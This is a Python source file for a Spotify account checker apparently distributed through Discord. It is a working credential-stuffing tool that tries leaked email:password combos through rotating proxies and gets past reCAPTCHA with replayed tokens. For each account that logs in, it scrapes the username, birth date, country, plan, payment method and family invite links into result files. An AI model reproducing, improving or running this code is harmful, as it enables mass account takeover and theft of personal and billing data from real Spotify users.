from requests import get, post, Session
from os import system, path, name, mkdir, _exit
from time import sleep, strftime
from ctypes import windll
from colorama import Fore, init
from random import choice
from bs4 import BeautifulSoup
from multiprocessing.dummy import Pool, Lock
from easygui import fileopenbox
from threading import Thread
from re import findall
import urllib.parse
import json
from urllib.request import urlretrieve as download
from webbrowser import open as webopen
init()
lock = Lock()
version = 1
announcement = "DM Grogu#0501 for support!"
discord = "N/A"
def grabproxy(proxy, type):
    if proxy.count(':') == 3:spl = proxy.split(':');proxy = f'{spl[2]}:{spl[3]}@{spl[0]}:{spl[1]}'
    else:return_proxy = proxy
    if type == 'http':return_proxy = {"http": f"http://{proxy}","https": f"https://{proxy}"}
    else:return_proxy = {"http": f"{type}://{proxy}","https": f"{type}://{proxy}"}
    return return_proxy
def createdirectory(name):
    unix = str(strftime('%d-%m-%Y %H-%M-%S'));folder = f'results/{name}-{unix}'
    if not path.exists('results'):mkdir('results')
    if not path.exists(folder):mkdir(folder)
    return folder
def set_title(title):windll.kernel32.SetConsoleTitleW(title)
def prints(line):lock.acquire();print(line);lock.release()
uaheaders = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36'}
if path.exists('settings.ahsokify'):
    fileReplace = str(open("settings.ahsokify", encoding="utf-8", errors="ignore").read()).replace("'", "\"")
    colorDict = json.loads(fileReplace)
    dictionaryOfCOlor= {
        'green': Fore.GREEN,
        'red': Fore.RED,
        'yellow': Fore.YELLOW,
        'blue': Fore.BLUE,
        'magenta': Fore.MAGENTA,
        'cyan': Fore.CYAN,
        'white': Fore.WHITE,
        'lightgreen': Fore.LIGHTGREEN_EX,
        'lightred': Fore.LIGHTRED_EX,
        'lightyellow': Fore.LIGHTYELLOW_EX,
        'lightblue': Fore.LIGHTBLUE_EX,
        'lightmagenta': Fore.LIGHTMAGENTA_EX,
        'lightcyan': Fore.LIGHTCYAN_EX
    }
    theme1 = dictionaryOfCOlor[str(colorDict["t1"]).lower()]
    theme2 = dictionaryOfCOlor[str(colorDict["t2"]).lower()]
else:
    theme1 = Fore.GREEN
    theme2 = Fore.WHITE
class settings:
    def getSettings(self):
        title()
        global theme1, theme2
        print(f"{theme2}Green, Red, Yellow, Blue, Magenta, Cyan, White, LightGreen, LightRed, LightYellow, LightBlue, LightMagenta, LightCyan")
        themechoice1 = input(f"{theme2}Theme Color 1: {theme1}")
        themechoice2 = input(f"{theme2}Theme Color 2: {theme1}")
        themecolors = {"t1": themechoice1, "t2":themechoice2}
        open("settings.ahsokify", "w", encoding="utf-8", errors="ignore").write(str(themecolors))
        if path.exists('settings.ahsokify'):
            fileReplace = str(open("settings.ahsokify", encoding="utf-8", errors="ignore").read()).replace("'", "\"")
            colorDict = json.loads(fileReplace)
            dictionaryOfCOlor = {
                'green': Fore.GREEN,
                'red': Fore.RED,
                'yellow': Fore.YELLOW,
                'blue': Fore.BLUE,
                'magenta': Fore.MAGENTA,
                'cyan': Fore.CYAN,
                'white': Fore.WHITE,
                'lightgreen': Fore.LIGHTGREEN_EX,
                'lightred': Fore.LIGHTRED_EX,
                'lightyellow': Fore.LIGHTYELLOW_EX,
                'lightblue': Fore.LIGHTBLUE_EX,
                'lightmagenta': Fore.LIGHTMAGENTA_EX,
                'lightcyan': Fore.LIGHTCYAN_EX
            }
            theme1 = dictionaryOfCOlor[str(colorDict["t1"]).lower()]
            theme2 = dictionaryOfCOlor[str(colorDict["t2"]).lower()]
        menu()
def title():
    system('cls' if name == 'nt' else 'clear')
    print(f'''{theme1}           _               _    _  __       
     /\   | |             | |  (_)/ _|      
    /  \  | |__  ___  ___ | | ___| |_ _   _ 
   / /\ \ | '_ \/ __|/ _ \| |/ / |  _| | | |
  / ____ \| | | \__ \ (_) |   <| | | | |_| |
 /_/    \_\_| |_|___/\___/|_|\_\_|_|  \__, |
                                       __/ |
                                      |___/ \n {theme2}Geographs#0501 & Grogu#0501\n\n {theme2}Announcement: {theme1}{announcement}\n''')
def menu():
    set_title(f"Ahsokify Spotify Checker - Geographs#0501 & Grogu#0501")
    title()
    print(f" {theme2}({theme1}1{theme2}) Spotify Checker")
    print(f" {theme2}({theme1}2{theme2}) Settings")
    print(f" {theme2}({theme1}3{theme2}) Join Discord Server")
    choice = input(f"{theme2}>{theme1} ")
    if choice == "1":
        Spotify().start()
    elif choice == "2":
        settings().getSettings()
    elif choice == "3":
        webopen(discord)
        menu()
    else:
        menu()
class Spotify:
    def __init__(self):
        self.checked = 0
        self.total = 0
        self.combos = []
        self.proxies = []
        self.good = 0
        self.free = 0
        self.bad = 0
        self.proxyErrors = 0
        self.proxyBans = 0
        self.timeout = 0
        self.cpm = 0
        self.directory = ''
    def cpmCounter(self):
        while True:
            now = self.checked
            sleep(1)
            self.cpm = (self.checked - now) * 60
    def consoleTitle(self):
        while True:
            set_title(f"Ahsokify - Geographs#0501 & Grogu#0501 | Checked: {self.checked}/{self.total} - Good: {self.good} - Free: {self.free} - Bad: {self.bad} | Proxy Errors: {self.proxyErrors} - Proxy Bans: {self.proxyBans} | CPM: {self.cpm}")
    def start(self):
        title()
        print(f"{theme2}Load combos.")
        self.combos = open(fileopenbox(title="Load Combos - Ahsokify by Geographs#0501 & Grogu#0501"), encoding="utf-8", errors="ignore").read().split("\n")
        if "" in self.combos:
            self.combos.remove("")
        self.total = len(self.combos)
        proxyType = input(f"{theme2}Proxy Type (Http/Socks4/Socks5):{theme1} ")
        if proxyType.lower() not in ["http", "socks4", "socks5"]:
            self.start()
        print(f"{theme2}Load proxies.")
        proxies = open(fileopenbox(title="Load Proxies - Ahsokify by Geographs#0501 & Grogu#0501"), encoding="utf-8", errors="ignore").read().split("\n")
        if "" in proxies:
            proxies.remove("")
        for line in proxies:
            self.proxies.append(grabproxy(line, proxyType))
        threads = int(input(f"{theme2}Threads: {theme1}"))
        self.timeout = int(input(f"{theme2}Timeout (in milliseconds): {theme1}")) / 1000

        Thread(target=self.consoleTitle, daemon=False).start()
        Thread(target=self.cpmCounter, daemon=False).start()
        pool = Pool(processes=threads)
        pool.imap_unordered(func=self.comboSorter, iterable=self.combos)
        pool.close()
        pool.join()
    def comboSorter(self, combo):
        if combo.__contains__(":") and combo.__contains__("@") and len(combo.split(":")[0]) > 0 and len(combo.split(":")[1]) > 0:
            self.login(urllib.parse.quote_plus(combo.split(":")[0]), urllib.parse.quote_plus(combo.split(":")[1]))
        else:
            self.bad += 1
            self.checked += 1

    def login(self, email, password):
        retries = 0
        comboCapture = [
            f"==============================",
            f"Combo: {email}:{password}",
            f"Email: {email}",
            f"Password: {password}"
        ]
        account = ""
        while retries < 10:
            retries += 1
            randomProxy = choice(self.proxies)
            try:
                tokenHeaders = {
                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "accept-encoding": "gzip, deflate, br",
                    "accept-language": "en-US,en;q=0.9,fa;q=0.8",
                    "Pragma": "no-cache",
                    "sec-fetch-dest": "document",
                    "sec-fetch-mode": "navigate",
                    "sec-fetch-site": "none",
                    "sec-fetch-user": "?1",
                    "upgrade-insecure-requests": "1",
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36"
                }
                reCapTokenResp = get("https://www.google.com/recaptcha/api2/anchor?ar=1&k=6LfCVLAUAAAAALFwwRnnCJ12DalriUGbj8FW_J39&co=aHR0cHM6Ly9hY2NvdW50cy5zcG90aWZ5LmNvbTo0NDM.&hl=en&v=iSHzt4kCrNgSxGUYDFqaZAL9&size=invisible&cb=q7o50gyglw4p", proxies=randomProxy, headers=tokenHeaders, timeout=self.timeout)
                reCapToken = BeautifulSoup(reCapTokenResp.content, 'html.parser').find("input", {"id": 'recaptcha-token'})['value']
            except:
                continue
            try:
                reCapData = {
                    "v": "iSHzt4kCrNgSxGUYDFqaZAL9",
                    "reason": "q",
                    "c": reCapToken,
                    "k": "6LfCVLAUAAAAALFwwRnnCJ12DalriUGbj8FW_J39",
                    "co": "aHR0cHM6Ly9hY2NvdW50cy5zcG90aWZ5LmNvbTo0NDM.",
                    "hl": "en",
                    "size": "invisible",
                    "chr": "%5B89%2C64%2C27%5D",
                    "vh": "13599012192",
                    "bg": "!q62grYxHRvVxjUIjSFNd0mlvrZ-iCgIHAAAB6FcAAAANnAkBySdqTJGFRK7SirleWAwPVhv9-XwP8ugGSTJJgQ46-0IMBKN8HUnfPqm4sCefwxOOEURND35prc9DJYG0pbmg_jD18qC0c-lQzuPsOtUhHTtfv3--SVCcRvJWZ0V3cia65HGfUys0e1K-IZoArlxM9qZfUMXJKAFuWqZiBn-Qi8VnDqI2rRnAQcIB8Wra6xWzmFbRR2NZqF7lDPKZ0_SZBEc99_49j07ISW4X65sMHL139EARIOipdsj5js5JyM19a2TCZJtAu4XL1h0ZLfomM8KDHkcl_b0L-jW9cvAe2K2uQXKRPzruAvtjdhMdODzVWU5VawKhpmi2NCKAiCRUlJW5lToYkR_X-07AqFLY6qi4ZbJ_sSrD7fCNNYFKmLfAaxPwPmp5Dgei7KKvEQmeUEZwTQAS1p2gaBmt6SCOgId3QBfF_robIkJMcXFzj7R0G-s8rwGUSc8EQzT_DCe9SZsJyobu3Ps0-YK-W3MPWk6a69o618zPSIIQtSCor9w_oUYTLiptaBAEY03NWINhc1mmiYu2Yz5apkW_KbAp3HD3G0bhzcCIYZOGZxyJ44HdGsCJ-7ZFTcEAUST-aLbS-YN1AyuC7ClFO86CMICVDg6aIDyCJyIcaJXiN-bN5xQD_NixaXatJy9Mx1XEnU4Q7E_KISDJfKUhDktK5LMqBJa-x1EIOcY99E-eyry7crf3-Hax3Uj-e-euzRwLxn2VB1Uki8nqJQVYUgcjlVXQhj1X7tx4jzUb0yB1TPU9uMBtZLRvMCRKvFdnn77HgYs5bwOo2mRECiFButgigKXaaJup6NM4KRUevhaDtnD6aJ8ZWQZTXz_OJ74a_OvPK9eD1_5pTG2tUyYNSyz-alhvHdMt5_MAdI3op4ZmcvBQBV9VC2JLjphDuTW8eW_nuK9hN17zin6vjEL8YIm_MekB_dIUK3T1Nbyqmyzigy-Lg8tRL6jSinzdwOTc9hS5SCsPjMeiblc65aJC8AKmA5i80f-6Eg4BT305UeXKI3QwhI3ZJyyQAJTata41FoOXl3EF9Pyy8diYFK2G-CS8lxEpV7jcRYduz4tEPeCpBxU4O_KtM2iv4STkwO4Z_-c-fMLlYu9H7jiFnk6Yh8XlPE__3q0FHIBFf15zVSZ3qroshYiHBMxM5BVQBOExbjoEdYKx4-m9c23K3suA2sCkxHytptG-6yhHJR3EyWwSRTY7OpX_yvhbFri0vgchw7U6ujyoXeCXS9N4oOoGYpS5OyFyRPLxJH7yjXOG2Play5HJ91LL6J6qg1iY8MIq9XQtiVZHadVpZVlz3iKcX4vXcQ3rv_qQwhntObGXPAGJWEel5OiJ1App7mWy961q3mPg9aDEp9VLKU5yDDw1xf6tOFMwg2Q-PNDaKXAyP_FOkxOjnu8dPhuKGut6cJr449BKDwbnA9BOomcVSztEzHGU6HPXXyNdZbfA6D12f5lWxX2B_pobw3a1gFLnO6mWaNRuK1zfzZcfGTYMATf6d7sj9RcKNS230XPHWGaMlLmNxsgXkEN7a9PwsSVwcKdHg_HU4vYdRX6vkEauOIwVPs4dS7yZXmtvbDaX1zOU4ZYWg0T42sT3nIIl9M2EeFS5Rqms_YzNp8J-YtRz1h5RhtTTNcA5jX4N-xDEVx-vD36bZVzfoMSL2k85PKv7pQGLH-0a3DsR0pePCTBWNORK0g_RZCU_H898-nT1syGzNKWGoPCstWPRvpL9cnHRPM1ZKemRn0nPVm9Bgo0ksuUijgXc5yyrf5K49UU2J5JgFYpSp7aMGOUb1ibrj2sr-D63d61DtzFJ2mwrLm_KHBiN_ECpVhDsRvHe5iOx_APHtImevOUxghtkj-8RJruPgkTVaML2MEDOdL_UYaldeo-5ckZo3VHss7IpLArGOMTEd0bSH8tA8CL8RLQQeSokOMZ79Haxj8yE0EAVZ-k9-O72mmu5I0wH5IPgapNvExeX6O1l3mC4MqLhKPdOZOnTiEBlSrV4ZDH_9fhLUahe5ocZXvXqrud9QGNeTpZsSPeIYubeOC0sOsuqk10sWB7NP-lhifWeDob-IK1JWcgFTytVc99RkZTjUcdG9t8prPlKAagZIsDr1TiX3dy8sXKZ7d9EXQF5P_rHJ8xvmUtCWqbc3V5jL-qe8ANypwHsuva75Q6dtqoBR8vCE5xWgfwB0GzR3Xi_l7KDTsYAQIrDZVyY1UxdzWBwJCrvDrtrNsnt0S7BhBJ4ATCrW5VFPqXyXRiLxHCIv9zgo-NdBZQ4hEXXxMtbem3KgYUB1Rals1bbi8X8MsmselnHfY5LdOseyXWIR2QcrANSAypQUAhwVpsModw7HMdXgV9Uc-HwCMWafOChhBr88tOowqVHttPtwYorYrzriXNRt9LkigESMy1bEDx79CJguitwjQ9IyIEu8quEQb_-7AEXrfDzl_FKgASnnZLrAfZMtgyyddIhBpgAvgR_c8a8Nuro-RGV0aNuunVg8NjL8binz9kgmZvOS38QaP5anf2vgzJ9wC0ZKDg2Ad77dPjBCiCRtVe_dqm7FDA_cS97DkAwVfFawgce1wfWqsrjZvu4k6x3PAUH1UNzQUxVgOGUbqJsaFs3GZIMiI8O6-tZktz8i8oqpr0RjkfUhw_I2szHF3LM20_bFwhtINwg0rZxRTrg4il-_q7jDnVOTqQ7fdgHgiJHZw_OOB7JWoRW6ZlJmx3La8oV93fl1wMGNrpojSR0b6pc8SThsKCUgoY6zajWWa3CesX1ZLUtE7Pfk9eDey3stIWf2acKolZ9fU-gspeACUCN20EhGT-HvBtNBGr_xWk1zVJBgNG29olXCpF26eXNKNCCovsILNDgH06vulDUG_vR5RrGe5LsXksIoTMYsCUitLz4HEehUOd9mWCmLCl00eGRCkwr9EB557lyr7mBK2KPgJkXhNmmPSbDy6hPaQ057zfAd5s_43UBCMtI-aAs5NN4TXHd6IlLwynwc1zsYOQ6z_HARlcMpCV9ac-8eOKsaepgjOAX4YHfg3NekrxA2ynrvwk9U-gCtpxMJ4f1cVx3jExNlIX5LxE46FYIhQ"
                }
                reCapHeaders = {
                    "accept": "*/*",
                    "accept-encoding": "gzip, deflate, br",
                    "accept-language": "en-US,en;q=0.9,fa;q=0.8",
                    "Pragma": "no-cache",
                    "origin": "https://www.google.com",
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36"
                }
                finalRecapTokenResp = post("https://www.google.com/recaptcha/api2/reload?k=6LfCVLAUAAAAALFwwRnnCJ12DalriUGbj8FW_J39", proxies=randomProxy, data=reCapData, headers=reCapHeaders, timeout=self.timeout)
                finalRecapToken = findall('"rresp","(.*?)"', finalRecapTokenResp.text)[0]
            except:
                continue
            try:
                cookieHeaders = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
                    "Pragma": "no-cache",
                    "Accept": "*/*"
                }
                cookieResp = get("https://accounts.spotify.com/en/login", proxies=randomProxy, headers=cookieHeaders, timeout=self.timeout)
                cookies = cookieResp.cookies.get_dict()
                csrf = cookies["csrf_token"]
                deviceID = cookies["__Host-device_id"]
                tPassion = cookies["__Secure-TPASESSION"]
            except:
                continue
            try:
                loginData = {
                    "remember": "true",
                    "continue": "https%3A%2F%2Fwww.spotify.com%2Fapi%2Fgrowth%2Fl2l-redirect",
                    "username": email,
                    "password": password,
                    "recaptchaToken": finalRecapToken,
                    "csrf_token": csrf
                }
                loginHeaders = {
                    "accept": "application/json, text/plain, */*",
                    "accept-encoding": "gzip, deflate, br",
                    "accept-language": "en-US,en;q=0.9,fa;q=0.8",
                    "content-length": str(len(f"remember=true&continue=https%3A%2F%2Fwww.spotify.com%2Fapi%2Fgrowth%2Fl2l-redirect&username={email}&password={password}&recaptchaToken={finalRecapToken}&csrf_token={csrf}")),
                    "origin": "https://accounts.spotify.com",
                    "referer": "https://accounts.spotify.com/en/login/?continue=https:%2F%2Fwww.spotify.com%2Fapi%2Fgrowth%2Fl2l-redirect&_locale=en-AE",
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36"
                }
                loginCookies = {
                    "sp_t": "576b5e3d-a565-47d4-94ce-0b6748fdc625",
                    "_gcl_au": "1.1.1585241231.1587921490",
                    "sp_adid": "fbe3a5fc-d8a3-4bc5-b079-3b1663ce0b49",
                    "_scid": "5eee3e0e-f16b-4f4c-bf73-188861f9fb0c",
                    "_hjid": "fb8648d2-549b-44c8-93e9-5bf00116b906",
                    "_fbp": "fb.1.1587921496365.773542932",
                    " __Host-device_id": f"{deviceID}",
                    "cookieNotice": "true",
                    "sp_m": "us",
                    "spot": "%7B%22t%22%3A1596548261%2C%22m%22%3A%22us%22%2C%22p%22%3Anull%7D",
                    "sp_last_utm": "%7B%22utm_campaign%22%3A%22alwayson_eu_uk_performancemarketing_core_brand%2Bcontextual-desktop%2Btext%2Bexact%2Buk-en%2Bgoogle%22%2C%22utm_medium%22%3A%22paidsearch%22%2C%22utm_source%22%3A%22uk-en_brand_contextual-desktop_text%22%7D",
                    "_gcl_dc": "GCL.1596996484.Cj0KCQjwvb75BRD1ARIsAP6LcqseeQ-2Lkix5DjAXxBo0E34KCiJWiUaLO3oZTeKYJaNRP0AKcttUN4aAlMyEALw_wcB",
                    "_gcl_aw": "GCL.1596996484.Cj0KCQjwvb75BRD1ARIsAP6LcqseeQ-2Lkix5DjAXxBo0E34KCiJWiUaLO3oZTeKYJaNRP0AKcttUN4aAlMyEALw_wcB",
                    "_gac_UA-5784146-31": "1.1596996518.Cj0KCQjwvb75BRD1ARIsAP6LcqseeQ-2Lkix5DjAXxBo0E34KCiJWiUaLO3oZTeKYJaNRP0AKcttUN4aAlMyEALw_wcB",
                    "ki_t": "1597938645946%3B1599140931855%3B1599140931855%3B3%3B3",
                    "ki_r": "",
                    "optimizelyEndUserId": "oeu1599636139883r0.3283057902318758",
                    "optimizelySegments": "%7B%226174980032%22%3A%22search%22%2C%226176630028%22%3A%22none%22%2C%226179250069%22%3A%22false%22%2C%226161020302%22%3A%22gc%22%7D",
                    "optimizelyBuckets": "%7B%7D",
                    "sp_landingref": "https%3A%2F%2Fwww.google.com%2F",
                    "_gid": "GA1.2.2046705606.1599636143",
                    "_sctr": "1|1599634800000",
                    "sp_usid": "ceb6c24c-d1b4-4895-bcb7-e4e386afd063",
                    "sp_ab": "%7B%222019_04_premium_menu%22%3A%22control%22%7D",
                    "_pin_unauth": "dWlkPVlUQXdaV0UyTXprdE1EQmxOaTAwWlRCbUxUbGtNVGN0T0RVeE1ERTVNalEwTnpBMSZycD1abUZzYzJV",
                    "__Secure-TPASESSION": f"{tPassion}",
                    "__bon": "MHwwfC0yODU4Nzc4NjN8LTEyMDA2ODcwMjQ2fDF8MXwxfDE=",
                    "remember": f"{email}",
                    "OptanonAlertBoxClosed": "2020-09-09T18: 37:10.735Z",
                    "OptanonConsent": "isIABGlobal=false&datestamp=Wed+Sep+09+2020+11%3A37%3A11+GMT-0700+(Pacific+Daylight+Time)&version=6.5.0&hosts=&consentId=89714584-b320-4c03-bd3c-be011bfaba6d&interactionCount=1&landingPath=NotLandingPage&groups=t00%3A1%2Cs00%3A1%2Cf00%3A1%2Cm00%3A1&AwaitingReconsent=false&geolocation=US%3BNJ",
                    "csrf_token": f"{csrf}",
                    "_ga_S35RN5WNT2": "GS1.1.1599675929.1.1.1599676676.0",
                    "_ga": "GA1.2.1572440783.1597938634",
                    "_gat": "1"
                }
                loginResp = post("https://accounts.spotify.com/login/password", proxies=randomProxy, data=loginData, headers=loginHeaders, cookies=loginCookies)
                if loginResp.text.__contains__("{\"result\":\"ok\",\""):
                    self.checked += 1
                    account = "good"
                elif loginResp.text.__contains__("{\"error\":\"server_error"):
                    self.proxyBans += 1
                    continue
                elif loginResp.text.__contains__("{\"error\":\"errorInvalidCredentials\"}"):
                    self.bad += 1
                    self.checked += 1
                    account = "bad"
                    break
                elif loginResp.status_code == 400:
                    self.proxyErrors += 1
                    continue
                elif loginResp.status_code == 401:
                    self.proxyErrors += 1
                    continue
                elif loginResp.status_code == 402:
                    self.proxyErrors += 1
                    continue
                elif loginResp.status_code == 403:
                    self.proxyErrors += 1
                    continue
                elif loginResp.status_code == 404:
                    self.proxyErrors += 1
                    continue
                elif loginResp.status_code == 405:
                    self.proxyErrors += 1
                    continue
                elif loginResp.status_code == 406:
                    self.proxyErrors += 1
                    continue
                elif loginResp.status_code == 407:
                    self.proxyErrors += 1
                    prints(f"{theme2}({theme1}Error{theme2}) - Proxy Authentication Failed. Please Check With Your Proxy Provider.")
                    continue
                elif loginResp.status_code == 429:
                    self.proxyErrors += 1
                    sleep(10)
                    continue
                elif loginResp.status_code == 502:
                    self.proxyErrors += 1
                    continue
                elif loginResp.status_code == 503:
                    self.proxyErrors += 1
                    prints(f"{theme2}({theme1}Error{theme2}) - Spotify API Might be Down.")
                    continue
                else:
                    self.proxyErrors += 1
                    retries += 2
                    continue
            except Exception as e:
                continue
            if self.directory == "":
                self.directory = createdirectory("Spotify")
            try:
                captureHeaders = {
                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "accept-encoding": "gzip, deflate, br",
                    "accept-language": "en-US,en;q=0.9,fa;q=0.8",
                    "cache-control": "max-age=0",
                    "sec-fetch-dest": "document",
                    "sec-fetch-mode": "navigate",
                    "sec-fetch-site": "none",
                    "sec-fetch-user": "?1",
                    "upgrade-insecure-requests": "1",
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36"
                }
                captureResp = get("https://www.spotify.com/us/api/account/overview/", proxies=randomProxy, headers=captureHeaders)
                username = findall("{\"label\":\"Username\",\"value\":\"(.*?)\"}", captureResp.text)[0]
                DOB = str(findall("{\"label\":\"Date of birth\",\"value\":\"(.*?)\"}", captureResp.text)[0]).replace("\\/", "/")
                country = findall("{\"label\":\"Country\",\"value\":\"(.*?)\"}", captureResp.text)[0]
                plan = findall("\"plan\":{\"name\":\"(.*?)\"", captureResp.text)[0]
                if plan.__contains__("Spotify Free"):
                    self.free += 1
                    comboCapture.append(f"Username: {username}")
                    comboCapture.append(f"Date of Birth: {DOB}")
                    comboCapture.append(f"Country: {country}")
                    comboCapture.append(f"Plan: Spotify Free")
                    comboCapture.append(f"==============================")
                    lock.acquire()
                    comboCapture = "\n".join(comboCapture)
                    open(f"{self.directory}/freeCapture.txt", "a", encoding="utf-8", errors="ignore").write(f'{comboCapture}\n')
                    open(f"{self.directory}/freeRaw.txt", "a", encoding="utf-8", errors="ignore").write(f'{email}:{password}\n')
                    print(f"{theme2}({theme1}Free{theme2}) - {email}:{password} | Username: {username}, DOB: {DOB}, Country: {country}, Plan: Spotify Free")
                    lock.release()
                else:
                    self.good += 1
                    nextBilling = str(findall("class=\\u0022recurring-date\\u0022\\u003E(.*?)\\u003C\\/b\\u003E.\"},", captureResp.text)[0]).replace("\\/", "/")
                    paymentMethod = findall("{\"paymentMethod\":{\"name\":\"(.*?)\",", captureResp.text)[0]
                    expiry = str(findall("\"expiry\":\"(.*?)\"", captureResp.text)[0]).replace("\\/", "/")
                    comboCapture.append(f"Username: {username}")
                    comboCapture.append(f"Date of Birth: {DOB}")
                    comboCapture.append(f"Country: {country}")
                    comboCapture.append(f"Plan: {plan}")
                    comboCapture.append(f"Next Billing: {nextBilling}")
                    comboCapture.append(f"Payment Method: {paymentMethod}")
                    comboCapture.append(f"Expiry: {expiry}")
                    if plan.__contains__("Spotify Premium Family"):
                        try:
                            headers = {
                                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                                "accept-encoding": "gzip, deflate, br",
                                "accept-language": "en-US,en;q=0.9,fa;q=0.8",
                                "cache-control": "max-age=0",
                                "sec-fetch-dest": "document",
                                "sec-fetch-mode": "navigate",
                                "sec-fetch-site": "none",
                                "sec-fetch-user": "?1",
                                "upgrade-insecure-requests": "1",
                                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36"
                            }
                            familyResp = get("https://www.spotify.com/us/home-hub/api/v1/family/home/", proxies=randomProxy, headers=headers)
                            inviteToken = familyResp.json()["inviteToken"]
                            inviteLink = f"https://www.spotify.com/{country}/family/join/invite/{inviteToken}/"
                            comboCapture.append(f"Spotify Family: {inviteLink}")
                            comboCapture.append(f"Plan: Spotify Premium Family")
                        except:
                            pass
                    else:
                        comboCapture.append(f"Plan: {plan}")
                    comboCapture.append(f"==============================")
                    lock.acquire()
                    comboCapture = "\n".join(comboCapture)
                    open(f"{self.directory}/goodCapture.txt", "a", encoding="utf-8", errors="ignore").write(f'{comboCapture}\n')
                    open(f"{self.directory}/goodRaw.txt", "a", encoding="utf-8", errors="ignore").write(f'{email}:{password}\n')
                    print(f"{theme2}({theme1}Good{theme2}) - {email}:{password} | Username: {username}, DOB: {DOB}, Country: {country}, Plan: {plan}")
                    lock.release()
            except:
                self.free += 1
                lock.acquire()
                open(f"{self.directory}/noCapture.txt", "a", encoding="utf-8", errors="ignore").write(f'{email}:{password}\n')
                print(f"{theme2}({theme1}No Capture{theme2}) - {email}:{password}")
                lock.release()
            break
        if account == "":
            self.bad += 1
            self.checked += 1

if __name__ == '__main__':
    menu()
    input("Done!")